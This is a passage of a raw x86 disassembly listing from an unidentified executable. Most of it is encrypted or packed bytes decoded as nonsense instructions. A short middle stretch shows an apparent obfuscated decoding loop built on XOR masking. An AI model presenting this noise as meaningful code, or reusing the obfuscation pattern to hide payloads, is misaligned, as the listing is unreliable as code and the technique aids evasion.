  40399e:	out    dx,eax
  40399f:	jb     0x40397c
  4039a1:	pop    esi
  4039a2:	push   esi
  4039a3:	(bad)  
  4039a4:	dec    ebx
  4039a5:	lock add eax,0xd877dbaa
  4039ab:	cmc    
  4039ac:	or     al,0xf8
  4039ae:	loopne 0x4039d5
  4039b0:	repnz test eax,0x661100c0
  4039b6:	sub    ecx,DWORD PTR [eax+edi*4+0x7c0327a]
  4039bd:	ins    BYTE PTR es:[edi],dx
  4039be:	imul   ebp,DWORD PTR [ebp+0x3f6c1dac],0x1ec71745
  4039c8:	scas   eax,DWORD PTR es:[edi]
  4039c9:	lods   eax,DWORD PTR ds:[esi]
  4039ca:	fs out 0x26,al
  4039cd:	fcomp  QWORD PTR [ecx+0x1714f581]
  4039d3:	outs   dx,DWORD PTR ds:[esi]
  4039d4:	imul   esp,DWORD PTR [ebp+eax*4-0x6c88b171],0xffffff8a
  4039dc:	inc    ecx
  4039dd:	loope  0x4039ba
  4039df:	sub    al,0x15
  4039e1:	mov    esi,0x6edbb317
  4039e6:	push   ebx
  4039e7:	lahf   
  4039e8:	(bad)  
  4039e9:	xlat   BYTE PTR ds:[ebx]
  4039ea:	stos   BYTE PTR es:[edi],al
  4039eb:	imul   ebx,esi,0x15
  4039ee:	sbb    cl,0xdd
  4039f1:	stos   BYTE PTR es:[edi],al
  4039f2:	aad    0xf0
  4039f4:	mov    esp,0x3e66443c
  4039f9:	push   ds
  4039fa:	pusha  
  4039fb:	(bad)  
  4039fc:	out    0x6f,al
  4039fe:	stos   DWORD PTR es:[edi],eax
  4039ff:	loopne 0x403a74
  403a01:	mov    ecx,0x1085b033
  403a06:	cli    
  403a07:	sbb    eax,0xac831872
  403a0c:	pop    ebx
  403a0d:	jle    0x4039ee
  403a0f:	pop    esp
  403a10:	or     DWORD PTR [ebp-0x74],ebp
  403a13:	fcom   DWORD PTR [esi-0x1a]
  403a16:	retf   0x6964
  403a19:	js     0x403a4b
  403a1b:	jnp    0x403a5d
  403a1d:	xchg   edi,eax
  403a1e:	mov    bh,0x6f
  403a20:	popf   
  403a21:	xchg   esi,eax
  403a22:	pop    DWORD PTR [ebp-0x25]
  403a25:	pmovmskb eax,mm4
  403a28:	xlat   BYTE PTR ds:[ebx]
  403a29:	ficomp DWORD PTR [ecx]
  403a2b:	sahf   
  403a2c:	xor    edi,DWORD PTR ds:0xefd17417
  403a32:	adc    ecx,DWORD PTR [eax]
  403a34:	push   ecx
  403a35:	sub    DWORD PTR [edx-0x7b],edi
  403a38:	xor    eax,0xf7019bc3
  403a3d:	jmp    0x811a:0x8295edd3
  403a44:	ret    
  403a45:	sub    al,0xa4
  403a47:	pop    edx
  403a48:	(bad)  
  403a4a:	retf   
  403a4b:	je     0x4039f0
  403a4d:	sub    al,0xed
  403a4f:	rcl    BYTE PTR [ecx+0xe0772c],1
  403a55:	fcom   DWORD PTR [edx-0x4179e83e]
  403a5b:	es adc eax,0x58461718
  403a61:	mov    dh,0xf2
  403a63:	into   
  403a64:	mov    edi,DWORD PTR gs:[ebp-0x4cc2d3b9]
  403a6b:	mov    ah,0xe7
  403a6d:	clc    
  403a6e:	cli    
  403a6f:	test   eax,0xcb27b90
  403a74:	xchg   BYTE PTR [ecx+0x6b],dh
  403a77:	inc    ebx
  403a78:	mov    esp,0xc323ab0e
  403a7d:	int    0xa0
  403a7f:	outs   dx,DWORD PTR ds:[esi]
  403a80:	setb   BYTE PTR [eax+0x4e]
  403a84:	push   es
  403a85:	add    dl,dh
  403a87:	outs   dx,BYTE PTR ds:[esi]
  403a88:	adc    BYTE PTR [eax+0x65],cl
  403a8b:	sbb    esp,0xffffffe3
  403a8e:	mov    ?,WORD PTR [ebx-0x7c]
  403a91:	push   ss
  403a92:	dec    ebp
  403a93:	ss inc eax
  403a95:	js     0x403b0c
  403a97:	mov    ecx,0x1f057e72
  403a9c:	adc    DWORD PTR [ecx+0x11b74e64],ebx
  403aa2:	inc    esi
  403aa3:	lods   al,BYTE PTR ds:[esi]
  403aa4:	cmp    al,0xeb
  403aa6:	out    0xb2,al
  403aa8:	jle    0x403ad0
  403aaa:	mov    edi,0x3455feea
  403aaf:	mov    ebp,?
  403ab1:	mov    al,0xe4
  403ab3:	push   ebx
  403ab4:	lea    edi,ds:[edi-0x2]
  403ab8:	shl    BYTE PTR [eax+eax*1+0x27],cl
  403abc:	out    dx,eax
  403abd:	pop    edx
  403abe:	in     al,0xb0
  403ac0:	pop    es
  403ac1:	call   0x694ab93e
  403ac6:	or     al,0xce
  403ac8:	adc    DWORD PTR [eax+0x21],ebx
  403acb:	xor    dh,BYTE PTR [edx+0x74]
  403ace:	pop    edi
  403acf:	sbb    DWORD PTR [esi],edi
  403ad1:	mov    esi,0xc3295beb
  403ad6:	push   0x1bd581b7
  403adb:	fs jmp 0x15aa:0xbccbac87
  403ae3:	je     0x403b08
  403ae5:	or     ecx,ecx
  403ae7:	mov    bl,0xf4
  403ae9:	cwde   
  403aea:	(bad)  
  403aed:	jnp    0x403a8f
  403aef:	into   
  403af0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403af1:	sub    eax,0xf18ceb57
  403af6:	adc    eax,0x35db07b5
  403afb:	inc    edx
  403afc:	ins    BYTE PTR es:[edi],dx
  403afd:	and    BYTE PTR [ecx],dl
  403aff:	sbb    DWORD PTR [esi+0x75d6e96c],esi
  403b05:	in     al,dx
  403b06:	jmp    0x90202b0e
  403b0b:	ret    0x5838
  403b0e:	lea    ebx,[ebp-0x77]
  403b11:	stos   BYTE PTR es:[edi],al
  403b12:	adc    ebx,0x3b
  403b15:	ror    DWORD PTR [ebx+0x4d89f44d],1
  403b1b:	or     BYTE PTR [ebx-0x7bf0f7b3],cl
  403b21:	dec    esi
  403b22:	and    eax,0x30e90000
  403b27:	add    BYTE PTR [eax],al
  403b29:	add    BYTE PTR [ebx+0x558b084d],cl
  403b2f:	clc    
  403b30:	xor    ecx,eax
  403b32:	xor    edx,eax
  403b34:	sub    ecx,edx
  403b36:	sub    ecx,esi
  403b38:	xor    ecx,eax
  403b3a:	mov    DWORD PTR [ebp+0x8],ecx
  403b3d:	mov    ecx,DWORD PTR [ebp+0x8]
  403b40:	mov    edx,DWORD PTR [ebp+0x8]
  403b43:	xor    ecx,eax
  403b45:	imul   edx,edx,0x5708f5
  403b4b:	add    ecx,esi
  403b4d:	lea    ecx,[ebp+ecx*4-0x64]
  403b51:	mov    edi,DWORD PTR [ecx]
  403b53:	add    edx,edi
  403b55:	mov    DWORD PTR [ecx],edx
  403b57:	mov    ecx,DWORD PTR [ebp+0x8]
  403b5a:	xor    ecx,eax
  403b5c:	add    ecx,esi
  403b5e:	jne    0x403b2a
  403b64:	mov    ecx,DWORD PTR [ebp-0x14]
  403b67:	mov    edx,DWORD PTR [ebp+0x8]
  403b6a:	xor    ecx,eax
  403b6c:	xor    edx,eax
  403b6e:	add    ecx,esi
  403b70:	add    edx,esi
  403b72:	cmp    ecx,edx
  403b74:	jae    0x405f8d
  403b7a:	lea    edx,[ecx-0x3272db]
  403b80:	mov    DWORD PTR [ebp-0x18],edx
  403b83:	mov    edi,DWORD PTR [ebp-0x18]
  403b86:	mov    DWORD PTR [ebp-0x24],0x705fd08
  403b8d:	lea    edx,[ebp-0x24]
  403b90:	mov    DWORD PTR [ebp-0x10],edx
  403b93:	mov    edx,DWORD PTR [ebp-0x10]
  403b96:	add    DWORD PTR [edx],0x705fa08
  403b9c:	mov    ebx,DWORD PTR [ebp-0x10]
  403b9f:	xor    edi,eax
  403ba1:	add    edi,DWORD PTR [ebx]
  403ba3:	lea    edx,[ebp+ecx*4-0x64]
  403ba7:	mov    ebx,DWORD PTR [edx]
  403ba9:	xor    edi,ebx
  403bab:	mov    DWORD PTR [edx],edi
  403bad:	jmp    0x405f30
  403bb2:	pop    esi
  403bb3:	stos   BYTE PTR es:[edi],al
  403bb4:	sbb    DWORD PTR [eax],esp
  403bb6:	gs (bad) 
  403bb8:	push   ebx
  403bb9:	lds    ecx,FWORD PTR fs:[ebp-0x420f0b8b]
  403bc0:	dec    esi
  403bc1:	pushf  
  403bc2:	sbb    al,0x5f
  403bc4:	bound  esp,QWORD PTR [edx+0x1c]
  403bc7:	pop    edi
  403bc8:	bound  esp,QWORD PTR [edx+0x3e]
  403bcb:	cdq    
  403bcc:	or     al,0x32
  403bce:	jp     0x403bc0
  403bd0:	xchg   BYTE PTR [eax-0x52],ch
  403bd3:	inc    esp
  403bd4:	not    DWORD PTR [edx-0x5]
  403bd7:	xchg   ebx,eax
  403bd8:	icebp  
  403bd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bda:	inc    esp
  403bdb:	jbe    0x403be6
  403bdd:	jge    0x403c4e
  403bdf:	cli    
  403be0:	shl    BYTE PTR [esi],cl
  403be2:	sub    DWORD PTR [eax+ebp*8+0x70],ebx
  403be6:	shl    edx,cl
  403be8:	cmp    ebp,esi
  403bea:	mov    ds:0x5e6aa857,al
  403bef:	mov    bh,BYTE PTR [ecx+ebp*8]
  403bf2:	mov    bl,BYTE PTR [ebp+0xa]
  403bf5:	push   esp
  403bf6:	cdq    
  403bf7:	out    0x57,al
  403bf9:	ja     0x403c64
  403bfb:	mov    ebx,0xd36961f8
  403c00:	mov    bl,0xe7
  403c02:	sub    eax,0xb460fec0
  403c07:	div    ebx
  403c09:	push   esp
  403c0a:	adc    dl,cl
  403c0c:	mov    bh,0x1a
  403c0e:	xlat   BYTE PTR ds:[ebx]
  403c0f:	mov    esp,0x8b66157
  403c14:	rdtsc  
  403c16:	fstp   QWORD PTR [eax-0x3dbf4426]
  403c1c:	adc    ch,bh
  403c1e:	or     al,0x19
  403c20:	cmp    ch,bh
  403c22:	push   esp
  403c23:	leave  
  403c24:	(bad)  
  403c25:	jge    0x403bfb
  403c27:	aaa    
  403c28:	sub    eax,0xa19a03fc
  403c2d:	push   ds
  403c2e:	mov    bh,0xa8
  403c30:	into   
  403c31:	adc    ch,0x29
  403c34:	mov    dl,0x56
  403c36:	retf   
  403c37:	aaa    
  403c38:	sbb    DWORD PTR [edx-0x68],0xb59f6b88
  403c3f:	xchg   DWORD PTR [eax],esp
  403c41:	iret   
  403c42:	jecxz  0x403be7
  403c44:	jmp    DWORD PTR [eax-0x4d]
  403c47:	jecxz  0x403c9a
  403c49:	sbb    ebx,0x81b4d30
  403c4f:	pop    ecx
  403c50:	jne    0x403c8f
  403c52:	imul   esp,DWORD PTR [edi+0x6c37afb3],0xd0e4ddc0
  403c5c:	dec    edx
  403c5d:	or     al,0x2f
  403c5f:	sub    bl,BYTE PTR [ecx+0x26]
  403c62:	test   DWORD PTR [ecx-0x54],eax
  403c65:	cli    
  403c66:	or     DWORD PTR [edi+0x1f69f5c0],edi
  403c6c:	pop    edi
  403c6d:	jns    0x403c0c
  403c6f:	imul   ebp,DWORD PTR [ebx],0xf3ef7f86
  403c75:	mov    DWORD PTR [esi],esi
  403c77:	fild   WORD PTR [eax+0x5c]
  403c7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c7b:	out    dx,al
  403c7c:	stos   DWORD PTR es:[edi],eax
  403c7d:	cwde   
  403c7e:	sub    dl,BYTE PTR [edx+0x37]
  403c81:	push   ss
  403c82:	mov    al,0xe8
  403c84:	inc    ebx
  403c85:	test   DWORD PTR [ebx],ebp
  403c87:	mov    bh,0xad
  403c89:	popf   
  403c8a:	cmp    ebx,eax
  403c8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c8d:	out    0xd,al
  403c8f:	out    0xcd,al
  403c91:	ds cli 
  403c93:	pop    ds
  403c94:	test   edi,esi
  403c96:	pop    ebx
  403c97:	and    BYTE PTR [edi],dl
  403c99:	repnz fild QWORD PTR [edi+esi*8]
  403c9d:	fld    QWORD PTR ds:0x9436ab59
  403ca3:	das    
  403ca4:	jo     0x403c49
  403ca6:	mov    eax,DWORD PTR [edx-0x3]
  403ca9:	xor    eax,0x25ac260a
  403cae:	sahf   
  403caf:	into   
  403cb0:	fadd   QWORD PTR [esi]
  403cb2:	mov    edi,DWORD PTR [ebp-0x21]
  403cb5:	fimul  WORD PTR [ebx+0x2edd388e]
  403cbb:	test   eax,0x14089319
  403cc0:	pop    edi
  403cc1:	mov    DWORD PTR [edi+0x53],ebp
  403cc4:	fbstp  TBYTE PTR [edi-0x10]
  403cc7:	scas   eax,DWORD PTR es:[edi]
  403cc8:	sub    al,0x45
  403cca:	inc    edi
  403ccb:	push   esp
  403ccc:	call   0x4fe86a8d
  403cd1:	dec    eax
  403cd2:	cmp    ecx,DWORD PTR [ebp-0x67c70b95]
  403cd8:	or     DWORD PTR [eax+0x38],ebx
  403cdb:	mov    ecx,0xb8ed5ced
  403ce0:	sub    bh,BYTE PTR [edi]
  403ce2:	shl    BYTE PTR [edx],1
  403ce4:	ins    BYTE PTR es:[edi],dx
  403ce5:	(bad)  
  403ce6:	push   ds
  403ce7:	mov    cl,0xba
  403ce9:	daa    
  403cea:	lods   eax,DWORD PTR ds:[esi]
  403ceb:	in     eax,0x4c
  403ced:	ror    bl,1
  403cef:	sbb    dl,ch
  403cf1:	adc    BYTE PTR [ebx-0x347a20a9],dl
  403cf7:	pusha  
  403cf8:	out    0x9a,eax
  403cfa:	cmp    DWORD PTR [ecx],0xf0f2952d
  403d00:	add    dh,0x93
  403d03:	xor    dl,BYTE PTR [esi]
  403d05:	sub    al,0x74
  403d07:	scas   eax,DWORD PTR es:[edi]
  403d08:	mul    DWORD PTR [eax-0x9b3e8d2]
  403d0e:	lahf   
  403d0f:	jbe    0x403d73
  403d11:	shr    BYTE PTR [edi-0x2e8bb77c],cl
  403d17:	inc    ecx
  403d18:	das    
  403d19:	mov    BYTE PTR [ecx*8+0x2accd883],al
  403d20:	cmc    
  403d21:	punpckldq mm1,DWORD PTR [ecx+ebp*4+0x5928fd8e]
  403d29:	ret    0xa8f4
  403d2c:	loope  0x403d7f
  403d2e:	pusha  
  403d2f:	mov    ch,0xaa
  403d31:	cmp    edx,edx
  403d33:	call   0x66b770c3
  403d38:	xchg   BYTE PTR [ebp+0x7dd6d9e4],ch
  403d3e:	iret   
  403d3f:	cmp    eax,DWORD PTR [eax+ebx*2]
  403d42:	in     al,0x4d
  403d44:	js     0x403dbe
  403d46:	sub    cl,dh
  403d48:	cmc    
  403d49:	push   0x74
  403d4b:	(bad)
  403d4f:	imul   esi,edi,0xc0fb0211
  403d55:	xchg   edi,eax
  403d56:	sti    
  403d57:	leave  
  403d58:	adc    DWORD PTR [esi+0x48e25bd9],0x4b
  403d5f:	inc    eax
  403d60:	jmp    0xe0e6:0x85ba2d9d
  403d67:	cs ret 
  403d69:	stos   DWORD PTR es:[edi],eax
  403d6a:	sahf   
  403d6b:	push   edi
  403d6c:	pusha  
  403d6d:	scas   eax,DWORD PTR es:[edi]
  403d6e:	xchg   edi,eax
  403d6f:	inc    ecx
  403d70:	xchg   esp,eax
  403d71:	xchg   BYTE PTR [ebx+0x4b64c371],ch
  403d77:	pusha  
  403d78:	aas    
  403d79:	adc    DWORD PTR [ecx+0x3691f4be],esp
  403d7f:	push   DWORD PTR [edx]
  403d81:	sub    dh,cl
  403d83:	add    al,0xf
  403d85:	or     al,0x74
  403d87:	(bad)  
  403d88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d89:	scas   al,BYTE PTR es:[edi]
  403d8a:	les    ebp,FWORD PTR [ecx-0x2fc2409c]
  403d90:	xor    DWORD PTR [edi-0x41],ecx
  403d93:	call   0x6f563668
  403d98:	mov    esp,esi
  403d9a:	ds out 0x9a,al
  403d9d:	push   es
  403d9e:	jmp    0x5696:0x3dc6c4c0
  403da5:	mov    al,0x3a
  403da7:	add    eax,0x5b2c0e36
  403dac:	(bad)  
  403dad:	mov    esp,0x164b1749
  403db2:	sbb    esp,DWORD PTR [eax+0x50]
  403db5:	push   ds
  403db6:	int    0xd3
  403db8:	das    
  403db9:	enter  0x99c5,0x28
  403dbd:	pop    esi
  403dbe:	inc    ebx
  403dbf:	adc    eax,DWORD PTR [ebx-0x29]
  403dc2:	fistp  WORD PTR [ebx+0x26f2917c]
  403dc8:	or     al,0x98
  403dca:	mov    WORD PTR [ebp+edx*1-0x4b],fs
  403dce:	pop    es
  403dcf:	dec    esi
  403dd0:	les    ecx,FWORD PTR [edi]
  403dd2:	lods   al,BYTE PTR ds:[esi]
  403dd3:	and    al,0x57
  403dd5:	push   edx
  403dd6:	sbb    esi,DWORD PTR [edi+0x74]
  403dd9:	inc    ebx
  403dda:	sbb    bh,BYTE PTR [ebp-0x46c45dce]
  403de0:	or     edx,DWORD PTR [edx+0x2c]
  403de3:	jle    0x403e4b
  403de5:	mov    ds:0xfd9da57a,al
  403dea:	xor    DWORD PTR [eax+0x43],0x2fd99812
  403df1:	pop    ebp
  403df2:	(bad)  
  403df3:	int3   
  403df4:	and    bl,BYTE PTR [edi]
  403df6:	sbb    esp,DWORD PTR [edx+0x5a]
  403df9:	push   eax
  403dfa:	jge    0x403d8c
  403dfc:	mov    al,0x2e
  403dfe:	push   esi
  403dff:	jle    0x403e7b
  403e01:	pop    ebp
  403e02:	js     0x403e54
  403e04:	adc    eax,0x3d568844
  403e09:	jp     0x403da8
  403e0b:	icebp  
  403e0c:	sbb    eax,0x5745314
  403e11:	push   esp
  403e12:	pop    ecx
  403e13:	popf   
  403e14:	inc    ebx
  403e15:	ret    0xee60
  403e18:	or     ch,BYTE PTR [ebp-0x199fbaf]
  403e1e:	xchg   edi,eax
  403e1f:	push   0x430bc703
  403e24:	mov    ?,ecx
  403e26:	icebp  
  403e27:	adc    DWORD PTR [eax+0x19cc459e],0x5c8d634f
  403e31:	sbb    edx,DWORD PTR [edx-0x30]
  403e34:	cmp    esi,edx
  403e36:	or     DWORD PTR [ebp+0x65],ebp
  403e39:	add    BYTE PTR ds:0x5034b185,al
  403e3f:	sub    edx,edi
  403e41:	out    dx,al
  403e42:	xor    eax,esi
  403e44:	in     al,0x76
  403e46:	mov    ebx,0xae7d49ba
  403e4b:	mov    cl,0xaa
  403e4d:	add    eax,0x2fe2d044
  403e52:	sub    eax,0x5135f5a7
  403e57:	xor    eax,0xeb60baeb
  403e5c:	fwait
  403e5d:	sub    eax,0x307604a8
  403e62:	(bad)  
  403e63:	ficom  WORD PTR [eax]
  403e65:	fwait
  403e66:	xchg   DWORD PTR [edx+0x22],edi
  403e69:	(bad)  
  403e6a:	pusha  
  403e6b:	pop    edi
  403e6c:	addr16 pop eax
  403e6e:	pop    ebp
  403e6f:	sub    ebp,DWORD PTR [edx]
  403e71:	shr    DWORD PTR [edx+0x67],1
  403e74:	adc    DWORD PTR ds:[ebp+0x1d],0x6effa86
  403e7c:	int3   
  403e7d:	xchg   esi,eax
  403e7e:	fsubr  QWORD PTR [edi-0x71]
  403e81:	in     al,0xc3
  403e83:	out    0x61,al
  403e85:	leave  
  403e86:	addr16 dec esp
  403e88:	(bad)  
  403e89:	cdq    
  403e8a:	mov    eax,0x759823fd
  403e8f:	jnp    0x403e97
  403e91:	bound  ebp,QWORD PTR [eax]
  403e93:	jns    0x403e3c
  403e95:	jbe    0x403e72
  403e97:	inc    edi
  403e98:	ja     0xe4fea971
  403e9e:	sub    DWORD PTR [eax],ebx
  403ea0:	sub    edi,edx
  403ea2:	sub    al,0xd
  403ea4:	sbb    DWORD PTR [ecx+0x53],edx
  403ea7:	push   edx
  403ea8:	lea    esi,[edx-0x34497e60]
  403eae:	aam    0x27
  403eb0:	jae    0x403ece
  403eb2:	jge    0x403ee9
  403eb4:	xchg   edx,eax
  403eb5:	aad    0x45
  403eb7:	inc    ecx
  403eb8:	inc    ebp
  403eb9:	repz in al,0x42
  403ebc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ebd:	inc    esi
  403ebe:	mov    bh,BYTE PTR [edi-0x6c73439f]
  403ec4:	mov    ebx,0xd76643b
  403ec9:	cmc    
  403eca:	or     dh,BYTE PTR [ebp+edi*2+0x77]
  403ece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ecf:	hlt    
  403ed0:	clc    
  403ed1:	xchg   edx,eax
  403ed2:	outs   dx,BYTE PTR ds:[esi]
  403ed3:	xchg   ebp,eax
  403ed4:	adc    bl,BYTE PTR [edx-0x84c7ef]
  403eda:	(bad)  
  403edb:	aas    
  403edc:	in     eax,dx
  403edd:	xor    eax,0xfc042072
  403ee2:	inc    edi
  403ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ee4:	sub    ebx,edi
  403ee6:	stc    
  403ee7:	mov    ebx,esp
  403ee9:	pop    edi
  403eea:	and    DWORD PTR [eax],edi
  403eec:	xchg   esp,eax
  403eed:	addr16 out dx,al
  403eef:	fisub  WORD PTR [edi-0x2442ad95]
  403ef5:	adc    DWORD PTR [ecx+0x74d7e0a9],0x3ab33d63
  403eff:	data16 xchg bl,ah
  403f02:	mov    cl,0xa4
  403f04:	in     al,0xb3
  403f06:	mov    cl,0x81
  403f08:	imul   ebp,DWORD PTR [edx-0x68],0x57d7d70c
  403f0f:	outs   dx,BYTE PTR ds:[esi]
  403f10:	xor    ch,dh
  403f12:	mov    bh,0x1c
  403f14:	lahf   
  403f15:	inc    edx
  403f16:	sub    cl,BYTE PTR [ecx+0x487091cf]
  403f1c:	sub    al,0x40
  403f1e:	adc    al,0xae
  403f20:	pop    ecx
  403f21:	xor    BYTE PTR [ebp+0x2fbdaf50],0x48
  403f28:	ins    DWORD PTR es:[edi],dx
  403f29:	xchg   edx,eax
  403f2a:	pop    es
  403f2b:	loop   0x403ec6
  403f2d:	or     DWORD PTR [eax+0x1eb094b5],edx
  403f33:	and    al,0x65
  403f35:	jb     0x403f48
  403f37:	ror    BYTE PTR [esi],cl
  403f39:	ds or  al,0x5e
  403f3c:	nop
  403f3d:	add    esp,DWORD PTR [ebp+0x13]
  403f40:	test   al,0xab
  403f42:	inc    ebp
  403f43:	jmp    0x8084:0x923b1fcb
  403f4a:	pop    edx
  403f4b:	push   ebx
  403f4c:	iret   
  403f4d:	mov    edx,0xa0a36413
  403f52:	das    
  403f53:	mov    ebx,0xd85ec356
  403f58:	inc    ecx
  403f59:	fistp  WORD PTR [ebp+0x56f044f8]
  403f5f:	out    dx,al
  403f60:	and    BYTE PTR [esi+edx*1],dl
  403f63:	pmaxsw mm1,QWORD PTR [ebx]
  403f66:	ins    BYTE PTR es:[edi],dx
  403f67:	sbb    esi,edx
  403f69:	adc    al,ch
  403f6b:	pop    ecx
  403f6c:	mov    dh,0x99
  403f6e:	cmp    eax,0xf3c77ab7
  403f73:	leave  
  403f74:	stc    
  403f75:	xlat   BYTE PTR ds:[ebx]
  403f76:	repnz repnz test eax,0xa7e05c02
  403f7d:	jo     0x403faf
  403f7f:	mov    al,0x86
  403f81:	push   es
  403f82:	jl     0x403fe4
  403f84:	push   0xffffffb6
  403f86:	sub    DWORD PTR [esi-0x73e03e6f],0x6037edc3
  403f90:	arpl   WORD PTR [ecx+0x79],di
  403f93:	dec    ebp
  403f94:	add    al,0x9c
  403f96:	lods   eax,DWORD PTR ds:[esi]
  403f97:	mov    bh,BYTE PTR [ebp+0x47784838]
  403f9d:	ss mov ecx,gs
  403fa0:	jnp    0x403f2b
  403fa2:	jbe    0x404010
  403fa4:	mov    ah,0xef
  403fa6:	sbb    eax,DWORD PTR [eax]
  403fa8:	or     eax,0xc4492154
  403fad:	jns    0x403fec
  403faf:	add    ah,ch
  403fb1:	fistp  QWORD PTR [edx]
  403fb3:	push   ss
  403fb4:	aam    0x4c
  403fb6:	pop    ecx
  403fb7:	aad    0x51
  403fb9:	jp     0x403fff
  403fbb:	daa    
  403fbc:	cli    
  403fbd:	mov    eax,DWORD PTR [edi-0x56a0e014]
  403fc3:	push   ecx
  403fc4:	dec    esp
  403fc5:	int    0xda
  403fc7:	push   ecx
  403fc8:	mov    ebx,0x45eccca9
  403fcd:	movups xmm7,XMMWORD PTR [esi]
  403fd0:	sar    BYTE PTR [ecx],cl
  403fd2:	mov    edi,0x8ca0be8c
  403fd7:	mov    ds:0x1ce8e5d8,al
  403fdc:	retf   0x728
  403fdf:	and    eax,0xdf3181bb
  403fe4:	test   BYTE PTR [esp+eax*4+0x5f],al
  403fe8:	mov    bh,0x5a
  403fea:	(bad)  
  403feb:	idiv   DWORD PTR [esi-0x64887283]
  403ff1:	scas   al,BYTE PTR es:[edi]
  403ff2:	sbb    DWORD PTR [edi-0x4852612f],0xb8649952
  403ffc:	push   ebp
  403ffd:	jmp    0x894d:0x57b0697d
  404004:	test   eax,0x6aeb81fc
  404009:	xor    eax,0xebe4ccb9
  40400e:	push   es
  40400f:	daa    
  404010:	and    DWORD PTR [eax-0x18d11702],ebx
  404016:	daa    
  404017:	sub    eax,0x8ecc5dcb
  40401c:	(bad)  
  40401d:	and    DWORD PTR [ebx+edx*8],esp
  404020:	loope  0x403fd8
  404022:	shl    DWORD PTR [edx+eiz*8+0xe],cl
  404026:	in     al,0xd1
  404028:	(bad)  
  404029:	call   0xa63d440c
  40402e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40402f:	lods   al,BYTE PTR ds:[esi]
  404030:	or     al,0x3
  404032:	jecxz  0x403fe0
  404034:	stc    
  404035:	xchg   ecx,eax
  404036:	retf   
  404037:	iret   
  404038:	add    edx,DWORD PTR [edx-0x1f3266a7]
  40403e:	fstp   TBYTE PTR [eax-0x23]
  404041:	jmp    0xfca3:0x568561eb
  404048:	ds in  al,0x6f
  40404b:	out    0x7,al
  40404d:	xchg   BYTE PTR [esi],bh
  40404f:	xor    cl,dl
  404051:	cmp    al,0xb8
  404053:	push   ebp
  404054:	ins    DWORD PTR es:[edi],dx
  404055:	inc    esp
  404056:	push   edx
  404057:	lea    eax,[eax-0x3e]
  40405a:	lds    ebx,FWORD PTR ds:0x8400ecce
  404060:	inc    eax
  404061:	xchg   esi,eax
  404062:	and    al,0x31
  404064:	mov    al,ch
  404066:	pop    edx
  404067:	jecxz  0x404038
  404069:	pop    ebp
  40406a:	gs cdq 
  40406c:	pop    es
  40406d:	and    BYTE PTR [edx-0x21],bl
  404070:	mov    al,0x6b
  404072:	xlat   BYTE PTR ds:[ebx]
  404073:	enter  0xda67,0xb7
  404077:	inc    esp
  404078:	test   eax,0x5dedf79b
  40407d:	add    edx,esp
  40407f:	pop    ecx
  404080:	clc    
  404081:	mov    ebx,0x142f6022
  404086:	sbb    eax,eax
  404088:	sbb    BYTE PTR [edx+0x58],bh
  40408b:	mov    es,WORD PTR [ecx+0xf]
  40408e:	rol    BYTE PTR [ebp-0x387458e3],0xa4
  404095:	imul   ebx,esi,0x243004ef
  40409b:	test   DWORD PTR [edi+0x23fd37ac],ebp
  4040a1:	fimul  WORD PTR [eax+0x3]
  4040a4:	enter  0x8fd9,0x51
  4040a8:	sbb    BYTE PTR [ecx],bh
  4040aa:	(bad)  
  4040ab:	pop    esp
  4040ac:	shl    DWORD PTR [edx],1
  4040ae:	fwait
  4040af:	mov    fs,WORD PTR [edx-0x4]
  4040b2:	clc    
  4040b3:	mov    cl,0xa8
  4040b5:	dec    esi
  4040b6:	bound  eax,QWORD PTR [eax+0x3f]
  4040b9:	jbe    0x40408c
  4040bb:	pop    ss
  4040bc:	sti    
  4040bd:	ret    0xcd65
  4040c0:	gs sub eax,0x62715aad
  4040c6:	dec    edx
  4040c7:	outs   dx,DWORD PTR ds:[esi]
  4040c8:	bound  edi,QWORD PTR [ecx]
  4040ca:	aam    0x6b
  4040cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040cd:	sub    DWORD PTR [eax+0x744751c6],0xffffffbb
  4040d4:	xor    eax,0x44f5a2b3
  4040d9:	jmp    0x4040a5
  4040db:	and    cl,BYTE PTR [ecx+0x75]
  4040de:	leave  
  4040df:	or     al,0xac
  4040e1:	bound  eax,QWORD PTR [ebx-0x48]
  4040e4:	or     BYTE PTR [edx-0x69],cl
  4040e7:	aam    0x5b
  4040e9:	push   ebp
  4040ea:	pop    esp
  4040eb:	js     0x404114
  4040ed:	out    dx,al
  4040ee:	sar    DWORD PTR [ebp+eiz*2-0x58a9b6bb],1
  4040f5:	mov    esp,0xaf252e88
  4040fa:	in     al,0xd7
  4040fc:	or     dl,BYTE PTR [eax+0x2c]
  4040ff:	push   ecx
  404100:	pushf  
  404101:	jmp    0x5cb8391d
  404106:	mov    ds:0xc7953a38,al
  40410b:	daa    
  40410c:	loop   0x404134
  40410e:	cdq    
  40410f:	daa    
  404110:	loop   0x40417d
  404112:	mov    ebx,0xe5ba2421
  404117:	xchg   esi,eax
  404118:	or     eax,0xeb744604
  40411d:	sbb    DWORD PTR [edi+0x23],esi
  404120:	inc    edx
  404121:	(bad)  
  404122:	std    
  404123:	fwait
  404124:	pop    ebx
  404125:	mov    cl,0xa
  404127:	jg     0x40414a
  404129:	stos   DWORD PTR es:[edi],eax
  40412a:	mov    esp,DWORD PTR [eax+0x36]
  40412d:	jae    0x40412f
  40412f:	mov    esp,DWORD PTR [bp+0x34]
  404133:	into   
  404134:	mov    ebx,0xc9ac63e9
  404139:	sar    BYTE PTR [esi+0x75],cl
  40413c:	xchg   ah,ah
  40413e:	nop
  40413f:	jmp    0x404122
  404141:	xchg   ecx,eax
  404142:	push   es
  404143:	aad    0xc
  404145:	hlt    
  404146:	fst    QWORD PTR [ebx-0x20590b48]
  40414c:	xchg   esp,eax
  40414d:	fisub  DWORD PTR [eax]
  40414f:	test   bl,bh
  404151:	adc    al,0xa2
  404153:	arpl   WORD PTR [ecx+0x77],bp
  404156:	dec    eax
  404157:	jmp    0x404160
  404159:	sub    bh,BYTE PTR [ecx]
  40415b:	add    eax,0x2c471552
